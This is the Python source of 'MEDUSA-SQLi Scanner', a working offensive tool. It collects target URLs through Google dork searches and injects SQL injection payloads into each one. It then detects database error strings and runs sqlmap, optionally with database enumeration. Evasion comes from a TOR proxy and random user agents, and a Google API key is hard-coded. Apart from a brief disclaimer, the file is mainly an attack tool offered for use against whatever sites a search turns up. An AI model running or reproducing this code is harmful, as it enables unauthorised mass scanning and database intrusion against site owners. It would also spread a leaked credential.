import requests
import json
import time
import random
import subprocess
import csv
from datetime import datetime
from fake_useragent import UserAgent 
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
from rich import print
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.markup import escape
from rich.status import Status
from urllib.parse import urlparse
import traceback

console = Console()


API_KEY = "AIzaSyArgC1gLYdApy58L7vvcbIXfyh_I7d1HyY"
CX = "737cdc23878fb4e11" 
LOG_FILE = "medusa-log.txt"
USE_PROXY = False
PROXY = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}


SQL_ERRORS = [
    "you have an error in your sql syntax;", "warning: mysql",
    "unclosed quotation mark after the character string", "quoted string not properly terminated",
    "sql syntax.*mysql", "syntax error.*in query expression", "mysql_fetch_array()",
    "mysqli_fetch_array()", "supplied argument is not a valid mysql result resource",
    "pg_query()", "pg_exec()", "ORA-01756", "Microsoft OLE DB Provider for SQL Server",
    "ADODB.Field error",
]

BASIC_SQLI_PAYLOADS = [
    "'", '"', "')", '")', "';", '";', "-- ", "'-- ", "\"-- ", "' OR '1'='1", "\" OR \"1\"=\"1",
]


def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    ascii_art = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⠿⢿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡴⠶⡄⣼⣿⠏⢠⠶⠦⡈⢻⣿⡄⡤⠶⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢠⡔⣖⣾⣿⠛⢷⣦⡀⣿⠀⠀⠁⢿⣿⡀⠳⠀⠠⠃⢸⣿⠇⠈⠀⢈⡇⣠⣴⠟⢛⣿⣖⡖⣤⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠏⠉⠉⢩⡋⠀⠆⠘⣿⡘⢷⣦⣤⣌⠻⣷⢆⠀⢀⣴⡿⢋⣤⣤⣶⠞⣱⿠⠁⣆⠈⡫⠉⠉⠉⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢘⠖⠉⠀⣸⡆⠄⣿⡇⠀⢀⣩⣤⣤⣈⠋⠀⠘⢊⣠⣤⣬⣉⠀⠀⢿⣇⠈⣿⡄⠀⠑⢔⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⣴⣶⢦⡄⣰⡟⡍⣸⡿⢀⣾⠟⠉⠉⠉⠙⢷⠄⢴⡿⠋⠉⠉⠙⢿⣆⠘⣿⡜⡜⣷⡀⣠⠴⣶⣤⣄⠀⠀⠀⠀
⠀⠀⠀⠀⣰⣿⡟⠏⠉⠉⠀⣿⢹⠀⣿⡇⠚⡠⣴⡾⠿⠿⣖⠀⠀⠈⠀⣺⠿⠿⣷⡢⡈⠁⣿⡇⢸⢸⣧⠈⠉⠉⢟⣿⡷⡄⠀⠀
⠀⠀⠀⠀⣿⣿⠎⠘⠉⢉⠈⣿⡜⡀⠰⢿⣶⣶⣶⣖⣒⡢⠀⢀⣄⣠⠈⠠⢖⣒⣶⢶⣶⣾⠿⠁⠸⣸⡿⢈⠉⠹⠀⢸⣿⡇⠀⠀
⠀⠀⠀⠀⢹⣿⣧⡀⠰⠏⢀⠹⣿⣦⣤⣤⣬⠍⠁⠀⣀⢄⣦⣾⣿⣿⣧⣔⣤⡀⠈⠉⢭⣥⣤⣤⣴⡿⠁⠈⢳⠀⣠⣿⣿⠃⠀⠀
⠀⠀⣀⡤⣄⠙⢿⣿⣶⣄⣈⡀⠀⠍⠙⠋⠉⠁⢀⡭⠙⠻⠿⠿⣿⣿⡿⠿⠛⠉⣅⠀⠉⠉⠛⠉⠍⠀⣈⣀⣴⣾⣟⠟⢁⡠⢤⡀
⠀⢰⡇⠀⠈⠀⠐⠬⣙⠛⠶⠶⠒⠋⢀⠖⡄⠀⢀⡀⠤⡀⡀⠀⣿⡟⠀⡠⡀⠄⣀⡄⠀⡄⢦⠀⠓⠲⠶⠞⢛⣫⠕⠀⠈⠁⠀⣿
⠀⠀⢷⣆⣰⡾⠀⠀⣀⣉⠉⠀⠀⠀⢸⣸⢀⠀⢸⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⡁⢀⢸⢸⠀⠀⠀⠈⢉⣁⡀⠀⠈⢷⣆⣶⠏
⠀⠀⣀⣠⡶⠫⢉⣭⣿⣯⡟⣷⣤⠀⠈⣿⣸⡀⠈⠻⣿⣿⣿⡿⢿⡿⣿⣿⣿⣿⠏⠀⢸⣸⡾⠀⢀⣴⡿⢯⣿⣯⣭⠩⠳⢦⣀⡀
⠀⢸⠷⠿⠶⠭⠿⠟⠋⡅⡆⠀⢙⠷⠀⠈⢿⣧⠈⡄⢽⣿⣿⣆⡀⣀⣼⣿⣿⢃⡠⢀⣶⡟⠀⢐⣝⠍⠀⡆⡍⠙⠿⠻⠵⠾⠧⢿
⠀⠀⠱⠁⠃⠀⠀⠀⠀⣧⠇⠀⠀⢻⡄⠀⡈⣿⠀⠙⢷⣿⣏⣤⣤⣤⣌⣿⣿⡷⠁⢸⡿⢠⠀⢸⠇⠀⢀⢷⡇⠀⠀⠀⠀⠇⠡⠁
⠀⠀⠀⠀⢀⣀⠀⣴⢸⡏⠈⠀⠀⣼⠇⣰⡇⠏⠀⠀⠈⠻⣿⣧⣤⣤⣿⡿⠋⠀⠀⠈⠃⣿⡀⢸⡶⡀⠀⠈⢶⢸⡄⠀⣀⡀⠀⠀
⠀⠀⠀⠀⠇⠀⠣⣻⡞⠀⠀⣠⣵⡟⢰⢿⠁⠀⢸⠀⠀⠀⠀⠙⠛⠛⠉⠀⠀⠀⢰⠀⠀⢹⢿⠘⢿⣴⡀⠀⠘⣯⡳⠃⠀⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠁⠀⢀⣼⣿⠏⠀⢸⣞⢄⣀⠜⠀⠀⠀⡀⠀⠀⠀⠀⠐⢀⠀⠘⢆⣀⠼⣼⠇⠈⢻⣿⣆⠀⠈⠈⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣜⣿⡏⣰⠀⠈⠻⢷⣦⠔⠃⢀⣷⣇⠀⠀⠀⢀⣶⣆⠀⠑⠦⣶⠿⠋⠀⠰⡄⢿⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣿⣇⠙⠶⠶⠃⢀⡴⠂⠀⣈⣾⣿⣆⠀⠀⣼⣿⣿⡄⠀⠰⣆⡀⠙⠶⠞⢁⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡷⠶⠶⡞⠏⠀⡠⠀⠘⣿⣿⣿⣦⣼⣿⣿⡿⠁⠠⡀⠘⠹⣲⠶⠶⣟⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⠃⠴⣤⠈⠻⢿⣿⣿⡿⠋⢀⡴⠄⢱⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢧⡤⠞⠀⠀⠀⠉⠁⠀⠀⠈⠧⣤⠾⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    info_text = """
                         𝙈𝙀𝘿𝙐𝙎𝘼 𝙏𝙊𝙊𝙇
        [bold yellow]Support :[/bold yellow] https://linktr.ee/pyscodes
        [bold yellow]Contact :[/bold yellow] https://instagram.com/pyscodes
"""
    full_banner_text = f"{ascii_art.strip()}\n{info_text.strip()}"
    panel_width = 80
    console.print(Panel(full_banner_text, title="[bold cyan]MEDUSA-SQLi Scanner[/]",
                        subtitle="[green]Author: PYSCODES | IG: @pyscodes", style="bold magenta", width=panel_width))

def write_log(text):
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {text}\n")
    except Exception as e:
        console.print(f"[red][!] Error writing log: {e}[/]")

def google_custom_search(dork, max_results=20):
  
    headers = {'User-Agent': UserAgent().random}
    urls = []; start_index = 1; results_fetched = 0
    console.print(f"[cyan][+] Searching dork:[/] {dork}"); write_log(f"Starting dork search: {dork}")
    while results_fetched < max_results:
        num_to_fetch = min(10, max_results - results_fetched);
        if num_to_fetch <= 0: break
        api_url = f"https://www.googleapis.com/customsearch/v1?q={dork}&key={API_KEY}&cx={CX}&start={start_index}&num={num_to_fetch}"
        try:
            proxies = PROXY if USE_PROXY else None
            response = requests.get(api_url, headers=headers, proxies=proxies, timeout=20); response.raise_for_status()
            data = response.json(); items = data.get('items', [])
            if not items: console.print(f"[yellow][!] No more results...[/]"); write_log(f"No more results for {dork} at index {start_index}."); break
            for item in items:
                link = item.get('link')
                if link: console.print(f"[green][+] URL found:[/] ", end=""); console.print(link, markup=False); write_log(f"Found URL: {link}"); urls.append(link); results_fetched += 1
                if results_fetched >= max_results: break
            next_page_info = data.get('queries', {}).get('nextPage')
            if next_page_info and results_fetched < max_results: start_index = next_page_info[0].get('startIndex', start_index + num_to_fetch)
            else: break
        except requests.exceptions.Timeout: console.print(f"[red][!] Timeout for dork: {dork}[/]"); write_log(f"Timeout for: {dork}"); break
        except requests.exceptions.RequestException as e:
            api_error_message = f"[red][!] API request failed: {e}[/]"; status_code = getattr(e.response, 'status_code', None)
            if status_code == 403: api_error_message += "\n[yellow]Hint: Check API Key/CX ID/quota/permissions.[/]"
            elif status_code == 400: api_error_message += "\n[yellow]Hint: Check CX config/query format.[/]"
            console.print(api_error_message); write_log(f"API error: {e}"); break
        except json.JSONDecodeError: console.print(f"[red][!] Error decoding API JSON.[/]"); write_log(f"JSON decode error. Status: {getattr(response, 'status_code', 'N/A')}, Text: {getattr(response, 'text', '')[:200]}..."); break
        except Exception as e: console.print(f"[red][!] Unexpected dorking error: {e}[/]"); write_log(f"Unexpected dorking error: {e}"); break
        time.sleep(random.uniform(1.5, 3.0))
    unique_urls = sorted(list(set(urls)))
    write_log(f"Dork '{dork}' finished. Found {len(unique_urls)} unique URLs.")
    return unique_urls


def check_sqli(url, fast_scan=False):
    original_url = url.strip()
    user_agent_string = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36' # Fallback default

    
    try:
        ua = UserAgent()
        
        if hasattr(ua, 'random') and isinstance(ua.random, str):
            user_agent_string = ua.random 
        else:
             write_log(f"Warning: UserAgent().random is not a string or missing (Type: {type(ua.random) if hasattr(ua, 'random') else 'Missing'}). Using static UA.")
    except Exception as ua_init_err:
         console.print(f"[red]Error initializing UserAgent: {ua_init_err}[/]")
         write_log(f"Error initializing UserAgent: {ua_init_err}. Using static UA.")

    headers = {'User-Agent': user_agent_string} 

    schemes_to_test = []; parsed_original = urlparse(original_url)
    if parsed_original.scheme in ('http', 'https'): schemes_to_test.append(parsed_original.scheme)
    elif not parsed_original.scheme and parsed_original.netloc: schemes_to_test.extend(['http', 'https'])
    elif not parsed_original.scheme and not parsed_original.netloc: schemes_to_test.extend(['http', 'https'])
    else: write_log(f"Skipping non-HTTP(S) URL: {original_url}"); return False

    for payload in BASIC_SQLI_PAYLOADS:
        for scheme in schemes_to_test:
            base_url = f"{scheme}://{parsed_original.netloc or original_url.split('/')[0]}{parsed_original.path}"
            if parsed_original.query: test_url = f"{base_url}?{parsed_original.query}{payload}"
            else: test_url = base_url + payload
            try:
                
                response = requests.get(test_url, headers=headers, timeout=15, proxies=PROXY if USE_PROXY else None, allow_redirects=True, verify=True)
                response.encoding = response.apparent_encoding if response.apparent_encoding else 'utf-8'
                content = response.text.lower()
                for error_pattern in SQL_ERRORS:
                    if error_pattern.lower() in content:
                        write_log(f"VULNERABLE: {original_url} (via {scheme}, payload: {repr(payload)}) - Error: '{error_pattern}'")
                        return True
            except requests.exceptions.Timeout: write_log(f"Timeout: {original_url} (payload: {repr(payload)}, scheme: {scheme})")
            except requests.exceptions.SSLError as ssl_err: write_log(f"SSL Error: {original_url} (payload: {repr(payload)}, scheme: {scheme}): {ssl_err}")
            except requests.exceptions.ConnectionError as conn_err: write_log(f"Connection Error: {original_url} (payload: {repr(payload)}, scheme: {scheme}): {conn_err}")
            except requests.exceptions.RequestException as req_err: write_log(f"Request Error: {original_url} (payload: {repr(payload)}, scheme: {scheme}): {req_err}")
            except Exception as e:
                error_type_msg = f"Unexpected Error in check_sqli loop: {e} (Type: {type(e)})"
                console.print(f"[red]{error_type_msg}[/]")
                write_log(error_type_msg + f" URL: {original_url} (payload: {repr(payload)}, scheme: {scheme})")
                if isinstance(e, TypeError) and "'str' object is not callable" in str(e): traceback.print_exc()

            if not fast_scan:
                time.sleep(random.uniform(0.1, 0.4))

    write_log(f"Safe: {original_url} (basic payloads)")
    return False


def export_to_csv(urls, filename="vulnerable_results.csv"):
    try:
        with open(filename, mode='w', newline='', encoding='utf-8') as file:
            writer = csv.writer(file); writer.writerow(["Vulnerable URL"])
            for url in urls: writer.writerow([url])
        abs_path = os.path.abspath(filename); console.print(f"[green][+] Results saved to:[/] {abs_path}"); write_log(f"Exported CSV: {abs_path}")
    except IOError as e: console.print(f"[red][!] Failed to save CSV: {e}[/]"); write_log(f"CSV export error: {e}")
    except Exception as e: console.print(f"[red][!] Unexpected CSV export error: {e}[/]"); write_log(f"Unexpected CSV export error: {e}")

def export_to_json(urls, filename="vulnerable_results.json"):
    try:
        data = {"scan_timestamp": datetime.now().isoformat(), "count": len(urls), "vulnerable_urls": urls}
        with open(filename, mode='w', encoding='utf-8') as file: json.dump(data, file, indent=4)
        abs_path = os.path.abspath(filename); console.print(f"[green][+] Results saved to:[/] {abs_path}"); write_log(f"Exported JSON: {abs_path}")
    except IOError as e: console.print(f"[red][!] Failed to save JSON: {e}[/]"); write_log(f"JSON export error: {e}")
    except Exception as e: console.print(f"[red][!] Unexpected JSON export error: {e}[/]"); write_log(f"Unexpected JSON export error: {e}")

def export_to_txt(urls, filename="vulnerable_results.txt"):
    try:
        with open(filename, mode='w', encoding='utf-8') as f:
            for url in urls: f.write(url + "\n")
        abs_path = os.path.abspath(filename); console.print(f"[green][+] Results saved to:[/] {abs_path}"); write_log(f"Exported TXT: {abs_path}")
    except IOError as e: console.print(f"[red][!] Failed to save TXT: {e}[/]"); write_log(f"TXT export error: {e}")
    except Exception as e: console.print(f"[red][!] Unexpected TXT export error: {e}[/]"); write_log(f"Unexpected TXT export error: {e}")

def run_sqlmap(url):
    console.print(f"\n[yellow][>] Attempting sqlmap against:[/] ", end=""); console.print(url, markup=False)
    write_log(f"Attempting sqlmap on: {url}")
    sqlmap_found = False
    try:
        subprocess.run(["sqlmap", "--version"], check=True, capture_output=True, text=True, stderr=subprocess.PIPE)
        sqlmap_found = True; write_log(f"sqlmap found via version check.")
    except FileNotFoundError:
        sqlmap_not_found_msg = "[red][!] 'sqlmap' command not found. Install it or check PATH.[/]"
        console.print(sqlmap_not_found_msg); write_log("sqlmap command not found."); return
    except (subprocess.CalledProcessError, Exception) as e:
         console.print(f"[yellow][!] Warning: Could not verify sqlmap version (Error: {e}). Will attempt to run anyway.[/]")
         write_log(f"Could not verify sqlmap version: {e}. Will attempt to run."); sqlmap_found = True

    if not sqlmap_found: return

    console.print("\n[cyan]--- Configure SQLMap Run ---[/]")
    level = Prompt.ask("Level (1-5)", default="3", choices=["1","2","3","4","5"])
    risk = Prompt.ask("Risk (1-3)", default="1", choices=["1","2","3"])
    threads = Prompt.ask("Threads", default="5")
    try: threads_int = int(threads); assert 1 <= threads_int <= 20; threads = str(threads_int)
    except (ValueError, AssertionError): console.print("[yellow]Invalid threads, using 5.[/]"); threads = "5"
    get_dbs = Confirm.ask("Enum databases (--dbs)?", default=False)
    console.print("[cyan]---------------------------[/]")
    if not Confirm.ask(f"Proceed with sqlmap on [bold]{url}[/]? ", default=True): console.print("[yellow][-] Skipping sqlmap...[/]"); write_log(f"sqlmap skipped after config."); return

    try:
        parsed = urlparse(url); hostname = parsed.netloc.replace(":", "_").replace("/", "_")
        safe_host = "".join(c for c in hostname if c.isalnum() or c in ('-', '_', '.')); out_dir = os.path.join("sqlmap_output", safe_host if safe_host else "default_host")
        os.makedirs(out_dir, exist_ok=True)
        cmd = ["sqlmap", "-u", url, "--batch", "--random-agent", f"--level={level}", f"--risk={risk}", f"--threads={threads}", "--output-dir", out_dir, "--disable-coloring"]
        if get_dbs: cmd.append("--dbs")
        console.print(f"[cyan]Executing:[/]", markup=False); console.print(' '.join(cmd), markup=False); write_log(f"Executing: {' '.join(cmd)}")
        proc = subprocess.run(cmd, check=False, capture_output=True, text=True)
        if proc.stdout: console.print("[dim]--- sqlmap stdout ---[/dim]"); console.print(proc.stdout, markup=False)
        if proc.stderr: console.print("[dim]--- sqlmap stderr ---[/dim]"); console.print(proc.stderr, markup=False)
        if proc.returncode == 0: console.print(f"[green][+] sqlmap finished successfully. Check '{out_dir}'...[/]"); write_log(f"sqlmap OK (0). Output: {out_dir}")
        else: console.print(f"[yellow][!] sqlmap finished with code {proc.returncode}. Check logs in '{out_dir}'.[/]"); write_log(f"sqlmap finished ({proc.returncode}). Output: {out_dir}")
    except FileNotFoundError:
         console.print("[red][!] 'sqlmap' command not found during execution attempt.[/]")
         write_log("sqlmap command not found during execution.")
    except Exception as e: console.print(f"[red][!] Error running sqlmap: {e}[/]"); write_log(f"Error running sqlmap: {e}")

def process_urls(urls_to_scan):
    if not urls_to_scan: console.print("[yellow][!] No URLs to scan.[/]"); write_log("process_urls: no URLs."); return
    vuln_urls = []; total = len(urls_to_scan)
    console.print(f"\n[blue][+] Checking {total} URL(s) for SQLi (basic payloads)...[/]"); write_log(f"Checking {total} URLs (basic payloads).")
    workers = min(15, total); count = 0
    if workers <= 0: workers = 1
    executor = ThreadPoolExecutor(max_workers=workers)
    try:
        futures = {executor.submit(check_sqli, url): url for url in urls_to_scan} 
        for future in as_completed(futures):
            url = futures[future]; count += 1; progress = f"({count}/{total})"
            try:
                is_vuln = future.result()
                if is_vuln: console.print(f"[bold red][VULNERABLE][/] {progress} -> ", end=""); console.print(url, markup=False); vuln_urls.append(url)
                else:
                    if total < 50: console.print(f"[dim green][SAFE][/]       {progress} -> ", end=""); console.print(url, markup=False)
                    elif count % 20 == 0: console.print(f"[dim cyan][PROGRESS][/]   {progress} URLs checked...")
            except Exception as exc: console.print(f"[red][!] Error processing {url}: {exc}[/]"); write_log(f"Error processing {url}: {exc}")
    except KeyboardInterrupt: console.print("\n[bold yellow][!] Scan interrupted...[/]"); write_log("Scan cancelled."); executor.shutdown(wait=False, cancel_futures=True); return
    finally:
         if executor: executor.shutdown(wait=True)

    console.print(f"\n[blue][+] Scan finished. Found {len(vuln_urls)} potentially vulnerable URL(s) (basic checks).[/]"); write_log(f"Basic scan finished. Found {len(vuln_urls)} potential.")
    if vuln_urls:
        console.print("\n[bold cyan]Potentially vulnerable URLs:[/bold cyan]")
        for url in vuln_urls: console.print(f"- ", end=""); console.print(url, markup=False)
        if Confirm.ask("\nExport vulnerable list?", default=True):
            fmt = Prompt.ask("Format", choices=["csv","json","txt"], default="csv")
            ts = datetime.now().strftime("%Y%m%d_%H%M%S"); fname = f"vulnerable_results_{ts}"
            if fmt=="csv": export_to_csv(vuln_urls, filename=f"{fname}.csv")
            elif fmt=="json": export_to_json(vuln_urls, filename=f"{fname}.json")
            elif fmt=="txt": export_to_txt(vuln_urls, filename=f"{fname}.txt")
        if Confirm.ask("\nRun configured sqlmap on vulnerable URLs?", default=False):
            for url in vuln_urls: run_sqlmap(url); time.sleep(1)
        else: console.print("[yellow][-] sqlmap skipped.[/]"); write_log("sqlmap skipped.")
    else: console.print("[green][+] No vulnerable URLs found (basic checks).[/]"); write_log("No vulnerable URLs found (basic).")

def scan_single_url():
    console.print("\n[cyan]--- Scan Single URL ---[/]")
    target_url = Prompt.ask("[bold yellow]Enter full URL to scan[/]")
    if not target_url: console.print("[red]URL empty.[/]"); return
    try:
        parsed = urlparse(target_url); assert parsed.scheme in ('http','https'); assert parsed.netloc
        console.print(f"[info]Scanning URL: {target_url}[/]"); write_log(f"Single scan: {target_url}")
        is_vulnerable = False
        with console.status("[bold green]Scanning URL with basic payloads...", spinner="dots"):
             
             is_vulnerable = check_sqli(target_url, fast_scan=True)

        if is_vulnerable:
            console.print(f"[bold red][VULNERABLE][/] Potential SQLi found: ", end=""); console.print(target_url, markup=False)
            if Confirm.ask("\nRun sqlmap?", default=True): run_sqlmap(target_url)
        else: console.print(f"[green][SAFE][/] No basic SQLi signs found: ", end=""); console.print(target_url, markup=False)
    except (ValueError, AssertionError): console.print(f"[red][!] Invalid URL format/scheme.[/]"); write_log(f"Invalid single URL: {target_url}")
    except Exception as e:
        console.print(f"[red][!] Error scanning single URL: {e}[/]");
        write_log(f"Error single scan {target_url}: {e}")
        if isinstance(e, TypeError) and "'str' object is not callable" in str(e):
             console.print("[bold yellow]>>> Traceback for TypeError <<<[/bold yellow]")
             traceback.print_exc()

def manage_log():
    console.print("\n[cyan]--- Log Management ---[/]")
    while True:
        console.print("[1] View Log Tail"); console.print("[2] Clear Log"); console.print("[3] Back")
        choice = Prompt.ask("Option", choices=["1", "2", "3"], default="3")
        if choice == "1":
            try:
                n = int(Prompt.ask("Lines to view?", default="20")); assert n > 0
                if not os.path.exists(LOG_FILE): console.print(f"[yellow]Log '{LOG_FILE}' not found.[/]"); continue
                with open(LOG_FILE, 'r', encoding='utf-8') as f: lines = f.readlines()
                if not lines: console.print(f"[yellow]Log '{LOG_FILE}' empty.[/]"); continue
                console.print(f"\n[cyan]--- Last {min(n, len(lines))} lines of {LOG_FILE} ---[/]")
                for line in lines[-n:]: console.print(escape(line.strip()))
                console.print("[cyan]-------------------------------------[/]")
            except (ValueError, AssertionError): console.print("[red]Invalid number.[/]")
            except IOError as e: console.print(f"[red]Error reading log: {e}[/]"); write_log(f"Error reading log: {e}")
            except Exception as e: console.print(f"[red]Unexpected error: {e}[/]")
        elif choice == "2":
            if not os.path.exists(LOG_FILE): console.print(f"[yellow]Log '{LOG_FILE}' not found.[/]"); continue
            if Confirm.ask(f"[bold yellow]Clear '{LOG_FILE}'? Cannot undo.[/]", default=False):
                try: open(LOG_FILE, 'w').close(); console.print(f"[green]Log '{LOG_FILE}' cleared.[/]"); write_log("Log cleared.")
                except IOError as e: console.print(f"[red]Error clearing log: {e}[/]"); write_log(f"Error clearing log: {e}")
                except Exception as e: console.print(f"[red]Unexpected error: {e}[/]")
            else: console.print("[yellow]Clear cancelled.[/]")
        elif choice == "3": break

def show_help():
    console.print(Panel(
        "[bold cyan]Medusa-SQLi Scanner[/]\n\n"
        "[b]Author:[/b] PYSCODES (IG: @pyscodes)\n[b]Support:[/b] https://linktr.ee/pyscodes\n\n"
        "[b]Description:[/b]\nHelps automate finding potential SQL injection vulnerabilities using Google Dorking "
        "(via CSE API) and basic payload checks. Integrates with SQLMap for deeper analysis.\n\n"
        "[b]Features:[/b]\n- Scan Single URL\n- Google Dorking (Manual & File)\n- Basic SQLi Checks\n"
        "- Export Results (CSV, JSON, TXT)\n- Configurable SQLMap Scan\n- TOR Proxy Support\n- Logging\n\n"
        "[b]Disclaimer:[/b]\nUse responsibly and only on systems you have explicit permission to test. "
        "Unauthorized scanning is illegal. Author not responsible for misuse.",
        title="[yellow]Help / About[/]", border_style="blue", padding=(1, 2)
    ))
    input("\nPress Enter to return to the menu...")

def main():
    global USE_PROXY
    os.makedirs("sqlmap_output", exist_ok=True); write_log("Application started.")
    while True:
        show_banner()
        proxy_stat = "[on green]Active[/]" if USE_PROXY else "[on red]Inactive[/]"
        console.print("\n[bold cyan]Main Menu:[/bold cyan]")
        console.print(Panel(
            f"[1] Scan Single URL\n[2] Manual Dork Search + SQLi Scan\n[3] Scan Dorks from File + SQLi Scan\n"
            f"[4] Toggle TOR Proxy: {proxy_stat}\n[5] Log Management\n[6] Help / About\n[7] Exit",
            title="[yellow]Options[/yellow]", border_style="blue", padding=(1, 2)
        ))
        choice = Prompt.ask("Select option", choices=["1","2","3","4","5","6","7"], default="1")

        if choice == "1": scan_single_url(); input("\nPress Enter to return...")
        elif choice == "2":
            dork = Prompt.ask("Enter dork");
            if not dork: console.print("[red]Dork empty.[/]"); time.sleep(1.5); continue
            max_res = 20; max_res_str = Prompt.ask("Max results", default="20")
            try: max_res = int(max_res_str); assert max_res > 0
            except (ValueError, AssertionError): console.print("[yellow]Invalid number, using 20.[/]")
            console.print(f"[info]Searching max {max_res}...[/]"); write_log(f"Manual dork: '{dork}', max={max_res}")
            urls = google_custom_search(dork, max_results=max_res)
            if urls: console.print(f"\n[cyan][+] Found {len(urls)} unique URL(s)...[/]"); process_urls(urls)
            else: console.print(f"[yellow][!] No URLs found for '{dork}'.[/]"); write_log(f"No results: '{dork}'")
            input("\nPress Enter to return...")
        elif choice == "3":
            fpath = Prompt.ask("Dorks file path")
            if not os.path.isfile(fpath): console.print(f"[red]File not found: {fpath}[/]"); write_log(f"Dork file missing: {fpath}"); time.sleep(2); continue
            max_res_pd = 10; max_res_str = Prompt.ask("Max results per dork", default="10")
            try: max_res_pd = int(max_res_str); assert max_res_pd > 0
            except (ValueError, AssertionError): console.print("[yellow]Invalid number, using 10.[/]")
            all_urls = []
            try:
                with open(fpath, 'r', encoding='utf-8') as f: dorks = [l.strip() for l in f if l.strip() and not l.startswith('#')]
                if not dorks: console.print(f"[yellow]Dork file '{fpath}' empty...[/]"); write_log(f"Dork file '{fpath}' empty."); time.sleep(2); continue
                total_d = len(dorks); console.print(f"[info]Processing {total_d} dorks from '{fpath}'...[/]"); write_log(f"Processing {total_d} dorks from {fpath}, max={max_res_pd}")
                for i, dork in enumerate(dorks):
                    console.print(f"\n[blue][+] Dork {i+1}/{total_d}: {dork}[/]"); console.print(f"[info]Searching max {max_res_pd}...[/]")
                    urls = google_custom_search(dork, max_results=max_res_pd)
                    if urls: all_urls.extend(urls)
                    time.sleep(random.uniform(1.0, 2.5))
                unique_urls = sorted(list(set(all_urls)))
                if unique_urls: console.print(f"\n[cyan][+] Found {len(unique_urls)} unique URLs total.[/]"); write_log(f"Found {len(unique_urls)} unique URLs from file."); process_urls(unique_urls)
                else: console.print("[yellow][!] No URLs found from file.[/]"); write_log("No URLs from file.")
            except IOError as e: console.print(f"[red][!] Failed to read file {fpath}: {e}[/]"); write_log(f"Error reading {fpath}: {e}")
            except Exception as e: console.print(f"[red][!] Error processing file: {e}[/]"); write_log(f"Error processing file: {e}")
            input("\nPress Enter to return...")
        elif choice == "4":
            USE_PROXY = not USE_PROXY; status = "[on green]Active[/]" if USE_PROXY else "[on red]Inactive[/]"
            console.print(f"[+] TOR Proxy: {status}"); write_log(f"TOR Proxy: {'Active' if USE_PROXY else 'Inactive'}"); time.sleep(1.5)
        elif choice == "5": manage_log()
        elif choice == "6": show_help()
        elif choice == "7": console.print("[bold magenta]Exiting... Goodbye Friend![/bold magenta]"); write_log("App shutdown."); exit()


if __name__ == '__main__':
    try: main()
    except KeyboardInterrupt: console.print("\n[bold yellow]Interrupted. Exiting.[/]"); write_log("App terminated (KeyboardInterrupt).")
    except Exception as e:
         console.print(f"\n[bold red][!] CRITICAL ERROR: {e}[/]"); traceback.print_exc()
         write_log(f"FATAL ERROR: {e}\n{traceback.format_exc()}")
         console.print("[dim]Check 'medusa-log.txt'.[/dim]")
